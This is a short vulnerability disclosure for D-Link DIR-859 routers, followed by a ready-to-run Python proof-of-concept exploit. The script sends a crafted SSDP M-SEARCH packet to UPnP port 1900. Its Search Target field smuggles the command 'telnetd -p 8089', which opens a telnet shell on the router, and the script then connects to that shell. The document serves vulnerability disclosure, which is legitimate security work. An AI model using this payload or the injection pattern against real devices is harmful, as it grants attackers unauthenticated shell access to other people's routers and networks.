# dir-859
Exploit Author: yangchunyuwhu@aliyun.com

Vendor: D-Link

Firmware: DIR-859_REVA_FIRMWARE_PATCH_1.06B01.zip

An issue was discovered on D-Link DIR-859 devices. Universal Plug and Play (UPnP) is enabled by default on port 1900. allowing an attacker to inject arbitrary command to the UPnP via a crafted M-SEARCH packet.An attacker can perform command injection by injecting a payload into the "Search Target" (ST) field of an SSDP M-SEARCH discovery packet.

# poc
from socket import *

from os import *

from time import *
 
payload = b'M-SEARCH * HTTP/1.1\r\n'

payload += b'HOST:localhost:1900\r\n'

payload += b'ST:urn:device:;telnetd -p 8089\r\n\r\n'
 
s = socket(AF_INET, SOCK_DGRAM, 0)

s.sendto(payload, ("192.168.0.1", 1900))

s.close()
 
sleep(1)

system("telnet 192.168.0.1 8089")
